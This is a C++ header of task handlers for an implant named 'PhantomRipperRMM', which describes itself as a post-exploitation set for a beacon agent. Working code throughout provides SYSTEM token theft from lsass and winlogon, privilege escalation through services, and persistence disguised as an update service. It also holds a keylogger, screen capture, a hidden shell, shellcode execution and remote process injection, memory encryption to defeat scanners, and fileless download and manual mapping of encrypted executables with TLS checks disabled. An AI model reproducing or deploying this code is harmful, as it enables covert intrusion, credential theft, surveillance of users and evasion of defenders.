// PhantomRipperRMM — built-in C++ task handlers.
// Header-only Win32 implementations so any agent including the bridge gets
// the core post-exploitation set without external dependencies:
//   shell, getsys (token theft), runas, steal, persist (service),
//   worker (session-0 -> interactive desktop), screen (BMP capture),
//   keylog (WH_KEYBOARD_LL), exec (local thread), inject (remote thread),
//   ps, kill
//
// Include AFTER agent_beacon.hpp. Handle order: built-ins first, host
// dispatch as fallback.

#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <map>
#include <mutex>
#include <thread>
#include <chrono>
#include <atomic>
#include <cstdio>
#include <sstream>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

namespace pr_tasks {

inline std::string esc(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:   out += c;
        }
    }
    return out;
}

// ---- token vault -----------------------------------------------------------
static std::map<std::string, HANDLE> g_vault;

inline bool enablePrivilege(const char* name) {
    HANDLE tok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return false;
    LUID luid{};
    if (!LookupPrivilegeValueA(nullptr, name, &luid)) { CloseHandle(tok); return false; }
    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(tok);
    return ok != FALSE;
}

inline bool stealTokenFrom(DWORD pid, std::string& err) {
    enablePrivilege("SeDebugPrivilege");
    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) { err = "OpenProcess failed"; return false; }
    HANDLE tok = nullptr;
    if (!OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &tok)) {
        CloseHandle(proc); err = "OpenProcessToken failed"; return false;
    }
    HANDLE dup = nullptr;
    if (!DuplicateTokenEx(tok, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &dup)) {
        CloseHandle(tok); CloseHandle(proc); err = "DuplicateTokenEx failed"; return false;
    }
    g_vault["default"] = dup;
    CloseHandle(tok);
    CloseHandle(proc);
    return true;
}

inline bool pidByName(const char* name, DWORD& pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    std::wstring want;
    for (const char* p = name; *p; ++p) want += (wchar_t)*p;
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, want.c_str()) == 0) { pid = pe.th32ProcessID; found = true; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

inline std::string selfPath() {
    char buf[MAX_PATH]{};
    GetModuleFileNameA(nullptr, buf, MAX_PATH);
    return std::string(buf);
}

inline bool createWithToken(HANDLE tok, const std::string& cmd, const char* desktop = nullptr) {
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.lpDesktop = const_cast<LPSTR>(desktop);
    PROCESS_INFORMATION pi{};
    std::vector<char> mutableCmd(cmd.begin(), cmd.end());
    mutableCmd.push_back(0);
    BOOL ok = CreateProcessAsUserA(tok, nullptr, mutableCmd.data(), nullptr, nullptr, FALSE,
                                   CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (ok) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    return ok != FALSE;
}

// ---- capture ----------------------------------------------------------------
inline std::string b64(const unsigned char* data, size_t len) {
    static const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    for (size_t i = 0; i < len; i += 3) {
        unsigned v = data[i] << 16 | (i + 1 < len ? data[i + 1] << 8 : 0) | (i + 2 < len ? data[i + 2] : 0);
        out += tbl[(v >> 18) & 63]; out += tbl[(v >> 12) & 63];
        out += i + 1 < len ? tbl[(v >> 6) & 63] : '=';
        out += i + 2 < len ? tbl[v & 63] : '=';
    }
    return out;
}

inline std::string captureScreenBmp() {
    SetProcessDPIAware();
    int x = GetSystemMetrics(76), y = GetSystemMetrics(77);
    int w = GetSystemMetrics(78), h = GetSystemMetrics(79);
    if (w <= 0 || h <= 0) return "screen: metrics failed";
    HDC screen = GetDC(nullptr);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    HGDIOBJ old = SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, screen, x, y, SRCCOPY);

    BITMAPINFO bi{};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;
    std::vector<unsigned char> pixels(w * h * 4);
    GetDIBits(mem, bmp, 0, h, pixels.data(), &bi, DIB_RGB_COLORS);

    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(nullptr, screen);

    BITMAPFILEHEADER fh{};
    fh.bfType = 0x4D42;
    fh.bfSize = DWORD(sizeof(fh) + sizeof(BITMAPINFOHEADER) + pixels.size());
    fh.bfOffBits = DWORD(sizeof(fh) + sizeof(BITMAPINFOHEADER));
    BITMAPINFOHEADER ih = bi.bmiHeader;

    std::string out;
    out.reserve(pixels.size() / 2);
    const char* fh_p = reinterpret_cast<const char*>(&fh);
    const char* ih_p = reinterpret_cast<const char*>(&ih);
    out.append(fh_p, sizeof(fh));
    out.append(ih_p, sizeof(ih));
    out.append(reinterpret_cast<const char*>(pixels.data()), pixels.size());
    return "[screenshot] " + b64(reinterpret_cast<const unsigned char*>(out.data()), out.size());
}

// ---- keylogger --------------------------------------------------------------
struct KeyState {
    std::atomic<bool> active{false};
    std::atomic<HHOOK> hook{nullptr};
    std::thread pump;
    std::string buffer;
    std::mutex mtx;
};

inline KeyState& keys() { static KeyState s; return s; }

inline LRESULT CALLBACK keyProc(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* k = reinterpret_cast<KBDLLHOOKSTRUCT*>(lp);
        char ch[8]{};
        BYTE state[256]{};
        GetKeyboardState(state);
        WCHAR w[8]{};
        HKL layout = GetKeyboardLayout(0);
        int n = ToUnicodeEx((UINT)k->vkCode, k->scanCode, state, w, 8, 0, layout);
        char title[256]{};
        GetWindowTextA(GetForegroundWindow(), title, 256);
        std::ostringstream line;
        line << "[" << (int)k->vkCode << "][" << title << "]";
        if (n > 0) line << w[0];
        KeyState& ks = keys();
        std::lock_guard<std::mutex> lock(ks.mtx);
        ks.buffer += line.str();
        if (ks.buffer.size() > 200000) ks.buffer.erase(0, 100000);
    }
    return CallNextHookEx(nullptr, code, wp, lp);
}

inline void keyPump(KeyState* ks) {
    ks->hook = SetWindowsHookExW(WH_KEYBOARD_LL, keyProc, nullptr, 0);
    MSG msg{};
    while (ks->active && GetMessageW(&msg, nullptr, 0, 0) > 0) {}
    if (ks->hook) { UnhookWindowsHookEx(ks->hook); ks->hook = nullptr; }
}

// ---- shell -------------------------------------------------------------------
inline std::string runShell(const std::string& cmd, DWORD timeoutMs = 120000) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE readEnd = nullptr, writeEnd = nullptr;
    if (!CreatePipe(&readEnd, &writeEnd, &sa, 0)) return "ERROR: CreatePipe failed";
    SetHandleInformation(readEnd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = writeEnd;
    si.hStdError = writeEnd;
    PROCESS_INFORMATION pi{};
    std::string full = "cmd.exe /c " + cmd;
    std::vector<char> mutableCmd(full.begin(), full.end());
    mutableCmd.push_back(0);

    if (!CreateProcessA(nullptr, mutableCmd.data(), nullptr, nullptr, TRUE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        CloseHandle(readEnd); CloseHandle(writeEnd);
        return "ERROR: CreateProcess failed";
    }
    CloseHandle(writeEnd);
    std::string out;
    char buf[4096];
    DWORD n = 0;
    DWORD start = GetTickCount();
    while (GetTickCount() - start < timeoutMs) {
        while (PeekNamedPipe(readEnd, nullptr, 0, nullptr, &n, nullptr) && n > 0) {
            DWORD read = 0;
            if (ReadFile(readEnd, buf, sizeof(buf), &read, nullptr) && read) out.append(buf, read);
            else break;
        }
        if (WaitForSingleObject(pi.hProcess, 200) == WAIT_OBJECT_0) {
            while (PeekNamedPipe(readEnd, nullptr, 0, nullptr, &n, nullptr) && n > 0) {
                DWORD read = 0;
                if (ReadFile(readEnd, buf, sizeof(buf), &read, nullptr) && read) out.append(buf, read);
                else break;
            }
            break;
        }
    }
    CloseHandle(readEnd);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    if (out.empty()) out = "[no output]";
    return out;
}

inline std::string hexToBytes(const std::string& hex, std::vector<unsigned char>& out) {
    auto nib = [](char c) -> int {
        if (c >= '0' && c <= '9') return c - '0';
        if (c >= 'a' && c <= 'f') return c - 'a' + 10;
        if (c >= 'A' && c <= 'F') return c - 'A' + 10;
        return -1;
    };
    std::string clean;
    for (char c : hex) if (nib(c) >= 0) clean += c;
    if (clean.size() % 2) return "odd hex length";
    out.clear();
    for (size_t i = 0; i < clean.size(); i += 2)
        out.push_back((unsigned char)((nib(clean[i]) << 4) | nib(clean[i + 1])));
    return "";
}

inline std::string selfSpawnArg(const char* flag) {
    // best-effort: re-run this exe with a flag (frozen agent assumed)
    return "\"" + selfPath() + "\" " + flag;
}

// ---- dispatcher ---------------------------------------------------------------
inline std::string handle(const std::string& verb, const std::string& args) {
    if (verb == "shell" || verb == "cmd") return runShell(args);

    if (verb == "getsys") {
        DWORD pid = 0;
        for (const char* n : {"winlogon.exe", "lsass.exe", "services.exe"}) {
            std::string stealErr;
            if (pidByName(n, pid) && stealTokenFrom(pid, stealErr)) {
                HANDLE tok = g_vault["default"];
                if (createWithToken(tok, selfSpawnArg("--system-child")))
                    return std::string("SYSTEM via ") + n + " token theft — child session beacons";
            }
        }
        // service tier
        std::string svc = "PhantomSvc" + std::to_string(GetTickCount() % 100000);
        std::string cmd = selfSpawnArg("--system-child");
        SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (scm) {
            SC_HANDLE s = CreateServiceA(scm, svc.c_str(), svc.c_str(), SERVICE_ALL_ACCESS,
                                         SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                                         SERVICE_ERROR_NORMAL, cmd.c_str(),
                                         nullptr, nullptr, nullptr, nullptr, nullptr);
            if (s) {
                StartServiceA(s, 0, nullptr);
                DeleteService(s);
                CloseServiceHandle(s);
                CloseServiceHandle(scm);
                return "SYSTEM via service spawn — child session beacons";
            }
            CloseServiceHandle(scm);
        }
        return "getsys: all tiers failed (no SeDebug target, no SCM access)";
    }

    if (verb == "steal") {
        std::string err;
        DWORD pid = atoi(args.c_str());
        if (stealTokenFrom(pid, err)) return "token from pid " + std::to_string(pid) + " vaulted";
        return "steal failed: " + err;
    }

    if (verb == "runas") {
        size_t sp = args.find(' ');
        if (sp == std::string::npos) return "usage: runas system|<pid> <cmd>";
        std::string ctx = args.substr(0, sp);
        std::string cmd = args.substr(sp + 1);
        enablePrivilege("SeDebugPrivilege");
        if (ctx == "system") {
            HANDLE tok = g_vault["default"];
            if (!tok) return "no SYSTEM token in vault — run getsys first";
            if (!createWithToken(tok, "cmd.exe /c " + cmd)) return "runas: CreateProcessAsUser failed";
            return "runas system: spawned";
        }
        DWORD pid = atoi(ctx.c_str());
        std::string err;
        if (!stealTokenFrom(pid, err)) return "steal failed: " + err;
        if (!createWithToken(g_vault["default"], "cmd.exe /c " + cmd)) return "runas: CreateProcessAsUser failed";
        return "runas pid " + std::to_string(pid) + ": spawned";
    }

    if (verb == "worker") {
        DWORD sid = WTSGetActiveConsoleSessionId();
        HANDLE tok = nullptr;
        if (!WTSQueryUserToken(sid, &tok)) return "worker: WTSQueryUserToken failed";
        HANDLE dup = nullptr;
        if (!DuplicateTokenEx(tok, TOKEN_ALL_ACCESS, nullptr, SecurityImpersonation, TokenPrimary, &dup))
            return "worker: DuplicateTokenEx failed";
        if (!createWithToken(dup, selfSpawnArg("--session-worker"), "winsta0\\default"))
            return "worker: CreateProcessAsUser failed";
        return "session worker launched into user desktop";
    }

    if (verb == "persist") {
        std::string svc = "PhantomSvc" + std::to_string(GetTickCount() % 100000);
        SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (!scm) return "persist: OpenSCManager failed (needs admin)";
        SC_HANDLE s = CreateServiceA(scm, svc.c_str(), "Phantom Update Service", SERVICE_ALL_ACCESS,
                                     SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
                                     SERVICE_ERROR_NORMAL, selfPath().c_str(),
                                     nullptr, nullptr, nullptr, nullptr, nullptr);
        CloseServiceHandle(scm);
        if (!s) return "persist: CreateService failed";
        CloseServiceHandle(s);
        return "persist: service " + svc + " installed (auto-start)";
    }

    if (verb == "screen") return captureScreenBmp();

    if (verb == "keylog") {
        KeyState& ks = keys();
        if (args == "start") {
            if (ks.active) return "keylog already running";
            ks.active = true;
            ks.pump = std::thread(keyPump, &ks);
            return "keylog started";
        }
        if (args == "stop") {
            ks.active = false;
            PostThreadMessageW(GetThreadId(ks.pump.native_handle()), WM_QUIT, 0, 0);
            return "keylog stopped";
        }
        std::lock_guard<std::mutex> lock(ks.mtx);
        std::string out = ks.buffer.empty() ? "(empty)" : ks.buffer;
        ks.buffer.clear();
        return out;
    }

    if (verb == "exec") {
        std::vector<unsigned char> sc;
        std::string err = hexToBytes(args, sc);
        if (!err.empty()) return "exec: " + err;
        void* mem = VirtualAlloc(nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!mem) return "exec: VirtualAlloc failed";
        memcpy(mem, sc.data(), sc.size());
        DWORD old = 0;
        VirtualProtect(mem, sc.size(), PAGE_EXECUTE_READ, &old);
        HANDLE t = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
        if (!t) return "exec: CreateThread failed";
        CloseHandle(t);
        return "exec: " + std::to_string(sc.size()) + " bytes running";
    }

    if (verb == "inject") {
        size_t sp = args.find(' ');
        if (sp == std::string::npos) return "usage: inject <pid> <hex>";
        DWORD pid = atoi(args.substr(0, sp).c_str());
        std::vector<unsigned char> sc;
        std::string err = hexToBytes(args.substr(sp + 1), sc);
        if (!err.empty()) return "inject: " + err;
        enablePrivilege("SeDebugPrivilege");
        HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!proc) return "inject: OpenProcess failed";
        void* remote = VirtualAllocEx(proc, nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote) { CloseHandle(proc); return "inject: VirtualAllocEx failed"; }
        SIZE_T written = 0;
        WriteProcessMemory(proc, remote, sc.data(), sc.size(), &written);
        HANDLE t = CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)remote, nullptr, 0, nullptr);
        CloseHandle(proc);
        if (!t) return "inject: CreateRemoteThread failed";
        CloseHandle(t);
        return "inject: " + std::to_string(written) + " bytes into pid " + std::to_string(pid);
    }

    if (verb == "ps") {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) return "ps: snapshot failed";
        PROCESSENTRY32W pe{};
        pe.dwSize = sizeof(pe);
        std::ostringstream out;
        if (Process32FirstW(snap, &pe)) {
            do {
                char name[261];
                WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
                out << pe.th32ProcessID << "\t" << name << "\n";
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        return out.str();
    }

    if (verb == "kill") {
        DWORD pid = atoi(args.c_str());
        HANDLE p = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (!p) return "kill: OpenProcess failed";
        BOOL ok = TerminateProcess(p, 1);
        CloseHandle(p);
        return ok ? ("killed " + std::to_string(pid)) : "kill: TerminateProcess failed";
    }

    return ""; // not a built-in — host dispatch handles it
}

// ---- sleep hygiene (memory scanner defeat) ---------------------------------
static std::mutex g_regionMtx;
static std::vector<std::pair<void*, size_t>> g_trackedRegions;

inline void trackRegion(void* p, size_t n) {
    std::lock_guard<std::mutex> lock(g_regionMtx);
    g_trackedRegions.push_back({ p, n });
}

// Encrypt + no-access every tracked region during idle; decrypt + RX on wake.
inline void sleepHygiene(bool hide) {
    static unsigned char skey = 0x5A;
    std::lock_guard<std::mutex> lock(g_regionMtx);
    for (auto& r : g_trackedRegions) {
        DWORD old = 0;
        if (!VirtualProtect(r.first, r.second, PAGE_READWRITE, &old)) continue;
        auto* p = (unsigned char*)r.first;
        for (size_t i = 0; i < r.second; ++i) p[i] ^= (skey + (unsigned char)(i & 0xFF));
        VirtualProtect(r.first, r.second, hide ? PAGE_NOACCESS : PAGE_EXECUTE_READ, &old);
    }
    skey += 0x40;
}

inline std::string execTracked(const std::vector<unsigned char>& sc) {
    void* mem = VirtualAlloc(nullptr, sc.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return "exec: VirtualAlloc failed";
    memcpy(mem, sc.data(), sc.size());
    trackRegion(mem, sc.size());
    DWORD old = 0;
    VirtualProtect(mem, sc.size(), PAGE_EXECUTE_READ, &old);
    HANDLE t = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
    if (!t) return "exec: CreateThread failed";
    CloseHandle(t);
    return "exec: " + std::to_string(sc.size()) + " bytes running (hygiene-tracked)";
}

// ---- fileless PE (remote AES-CBC fetch + manual map) ------------------------
inline std::string b64Decode(const std::string& in, std::vector<unsigned char>& out) {
    auto nib = [](char c) -> int {
        if (c >= 'A' && c <= 'Z') return c - 'A';
        if (c >= 'a' && c <= 'z') return c - 'a' + 26;
        if (c >= '0' && c <= '9') return c - '0' + 52;
        if (c == '+') return 62;
        if (c == '/') return 63;
        return -1;
    };
    out.clear();
    int val = 0, bits = 0;
    for (char c : in) {
        int d = nib(c);
        if (d < 0) continue;
        val = (val << 6) | d;
        bits += 6;
        if (bits >= 8) { bits -= 8; out.push_back((unsigned char)((val >> bits) & 0xFF)); }
    }
    return "";
}

inline std::string fetchUrlA(const std::string& url, std::vector<unsigned char>& body) {
    // expect https://host[:port]/path
    std::string host, path = "/";
    bool tls = false;
    unsigned short port = 443;
    size_t p = url.find("://");
    std::string rest = p == std::string::npos ? url : url.substr(p + 3);
    tls = url.rfind("https://", 0) == 0;
    size_t slash = rest.find('/');
    host = slash == std::string::npos ? rest : rest.substr(0, slash);
    if (slash != std::string::npos) path = rest.substr(slash);
    size_t colon = host.find(':');
    if (colon != std::string::npos) { port = (unsigned short)atoi(host.substr(colon + 1).c_str()); host = host.substr(0, colon); }

    HINTERNET ses = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!ses) return "WinHttpOpen failed";
    HINTERNET con = WinHttpConnect(ses, std::wstring(host.begin(), host.end()).c_str(), tls ? INTERNET_DEFAULT_HTTPS_PORT : INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!con) { WinHttpCloseHandle(ses); return "WinHttpConnect failed"; }
    HINTERNET rq = WinHttpOpenRequest(con, L"GET", std::wstring(path.begin(), path.end()).c_str(), nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, tls ? WINHTTP_FLAG_SECURE : 0);
    if (!rq) { WinHttpCloseHandle(con); WinHttpCloseHandle(ses); return "WinHttpOpenRequest failed"; }
    if (tls) {
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(rq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
    }
    BOOL ok = WinHttpSendRequest(rq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
           && WinHttpReceiveResponse(rq, nullptr);
    if (!ok) { WinHttpCloseHandle(rq); WinHttpCloseHandle(con); WinHttpCloseHandle(ses); return "request failed"; }
    DWORD avail = 0, read = 0;
    while (WinHttpQueryDataAvailable(rq, &avail) && avail) {
        std::vector<char> chunk(avail);
        WinHttpReadData(rq, chunk.data(), avail, &read);
        body.insert(body.end(), chunk.begin(), chunk.begin() + read);
    }
    WinHttpCloseHandle(rq); WinHttpCloseHandle(con); WinHttpCloseHandle(ses);
    return "";
}

// CAPI AES-256-CBC, key = SHA256(passphrase), IV = first 16 bytes of blob.
inline std::string aesDecryptCbc(const unsigned char* keyPass, size_t keyLen, std::vector<unsigned char>& blob) {
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContextW(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "CryptAcquireContext failed";
    HCRYPTHASH hHash = 0;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return "CryptCreateHash failed"; }
    CryptHashData(hHash, keyPass, (DWORD)keyLen, 0);
    HCRYPTKEY hKey = 0;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return "CryptDeriveKey failed"; }
    CryptDestroyHash(hHash);
    if (blob.size() <= 16) { CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0); return "blob too small"; }
    CryptSetKeyParam(hKey, KP_IV, (BYTE*)blob.data(), 0);
    DWORD len = (DWORD)(blob.size() - 16);
    BYTE* data = (BYTE*)malloc(len);
    memcpy(data, blob.data() + 16, len);
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data, &len)) {
        DWORD e = GetLastError();
        free(data); CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0);
        return "CryptDecrypt failed (" + std::to_string(e) + ")";
    }
    blob.assign(data, data + len);
    free(data);
    CryptDestroyKey(hKey); CryptReleaseContext(hProv, 0);
    return "";
}

// Full reflective-style manual mapper with imports + relocations.
inline std::string manualMapAndRun(std::vector<unsigned char> image) {
    if (image.size() < 0x40 || image[0] != 'M' || image[1] != 'Z') return "pe: bad MZ";
    auto rd16 = [&](size_t o) { return *(unsigned short*)(image.data() + o); };
    auto rd32 = [&](size_t o) { return *(unsigned int*)(image.data() + o); };
    size_t e_lfanew = rd32(0x3C);
    if (rd32(e_lfanew) != 0x00004550) return "pe: bad PE sig";
    size_t coff = e_lfanew + 4;
    unsigned short numSec = rd16(coff + 2);
    unsigned short optSize = rd16(coff + 16);
    size_t opt = coff + 20;
    unsigned short magic = rd16(opt);
    bool is64 = magic == 0x20B;
    unsigned int entryRva = rd32(opt + 16);
    unsigned long long prefBase = is64 ? *(unsigned long long*)(image.data() + opt + 24) : rd32(opt + 28);
    unsigned int sizeImg = rd32(opt + 56);
    unsigned int sizeHdr = rd32(opt + 60);
    unsigned int impRva = rd32(opt + (is64 ? 120 : 104));
    unsigned int relRva = rd32(opt + (is64 ? 152 : 136)), relSize = rd32(opt + (is64 ? 156 : 140));

    void* base = VirtualAlloc((void*)prefBase, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    unsigned long long delta = 0;
    if (!base) {
        base = VirtualAlloc(nullptr, sizeImg, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!base) return "pe: VirtualAlloc failed";
        delta = (unsigned long long)base - prefBase;
    }
    memcpy(base, image.data(), sizeHdr);
    size_t secOff = opt + optSize;
    for (unsigned short i = 0; i < numSec; ++i) {
        unsigned char* s = image.data() + secOff + i * 40;
        unsigned int vaddr = *(unsigned int*)(s + 12);
        unsigned int rsize = *(unsigned int*)(s + 16);
        unsigned int rptr = *(unsigned int*)(s + 20);
        if (rsize && rptr) memcpy((unsigned char*)base + vaddr, image.data() + rptr, rsize);
    }

    if (delta && relRva && relSize) {
        unsigned char* walk = (unsigned char*)base + relRva;
        unsigned char* end = walk + relSize;
        while (walk < end) {
            unsigned int pageRva = *(unsigned int*)walk;
            unsigned int bsize = *(unsigned int*)(walk + 4);
            if (bsize == 0) break;
            unsigned int count = (bsize - 8) / 2;
            for (unsigned int j = 0; j < count; ++j) {
                unsigned short e = *(unsigned short*)(walk + 8 + j * 2);
                unsigned short type = e >> 12;
                if (type == 0) continue;
                void* target = (unsigned char*)base + pageRva + (e & 0xFFF);
                if (type == 10 && is64) *(unsigned long long*)target += delta;
                else if (type == 3 && !is64) *(unsigned int*)target += (unsigned int)delta;
            }
            walk += bsize;
        }
    }

    if (impRva) {
        unsigned char* walk = (unsigned char*)base + impRva;
        for (;; walk += 20) {
            unsigned int oft = *(unsigned int*)walk;
            unsigned int nameRva = *(unsigned int*)(walk + 12);
            unsigned int ft = *(unsigned int*)(walk + 16);
            if (!oft && !nameRva && !ft) break;
            if (!nameRva) continue;
            char* dllName = (char*)base + nameRva;
            HMODULE hMod = LoadLibraryA(dllName);
            if (!hMod) continue;
            unsigned char* lookup = (unsigned char*)base + (oft ? oft : ft);
            unsigned char* iat = (unsigned char*)base + ft;
            for (int j = 0;; ++j) {
                unsigned long long val = is64 ? *(unsigned long long*)(lookup + j * 8) : *(unsigned int*)(lookup + j * 4);
                if (!val) break;
                void* func = nullptr;
                if ((is64 && (val >> 63)) || (!is64 && (val >> 31))) {
                    func = GetProcAddress(hMod, MAKEINTRESOURCEA((unsigned short)(val & 0xFFFF)));
                } else {
                    char* fname = (char*)base + (unsigned int)(val + 2);
                    func = GetProcAddress(hMod, fname);
                }
                if (is64) *(unsigned long long*)(iat + j * 8) = (unsigned long long)func;
                else *(unsigned int*)(iat + j * 4) = (unsigned int)(size_t)func;
            }
        }
    }

    DWORD oldP = 0;
    VirtualProtect(base, sizeImg, PAGE_EXECUTE_READWRITE, &oldP);
    trackRegion(base, sizeImg);
    HANDLE t = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)((unsigned char*)base + entryRva), nullptr, 0, nullptr);
    if (!t) return "pe: entry thread failed";
    CloseHandle(t);
    char msg[128];
    sprintf_s(msg, "pe mapped @ 0x%llx (delta %lld) entry running", (unsigned long long)base, (long long)delta);
    return std::string(msg);
}

inline std::string task_pe(const std::string& args) {
    // pe <passphrase> <b64(iv+aes256cbc(pe))>   |   peurl <passphrase> <url>
    size_t sp = args.find(' ');
    if (sp == std::string::npos) return "usage: pe <passphrase> <b64> | peurl <passphrase> <url>";
    std::string first = args.substr(0, sp);
    std::string rest = args.substr(sp + 1);

    std::vector<unsigned char> blob;
    if (first == "peurl") {
        size_t sp2 = rest.find(' ');
        if (sp2 == std::string::npos) return "usage: peurl <passphrase> <url>";
        std::string pass = rest.substr(0, sp2);
        std::string url = rest.substr(sp2 + 1);
        std::string ferr = fetchUrlA(url, blob);
        if (!ferr.empty()) return "pe: " + ferr;
        std::string b64s(blob.begin(), blob.end());
        std::string derr = b64Decode(b64s, blob);
        if (!derr.empty()) return "pe: " + derr;
        std::string derr2 = aesDecryptCbc(pass.data(), pass.size(), blob);
        if (!derr2.empty()) return "pe: " + derr2;
    } else {
        std::string pass = first;
        std::string derr = b64Decode(rest, blob);
        if (!derr.empty()) return "pe: " + derr;
        std::string derr2 = aesDecryptCbc(pass.data(), pass.size(), blob);
        if (!derr2.empty()) return "pe: " + derr2;
    }
    return manualMapAndRun(blob);
}

} // namespace pr_tasks
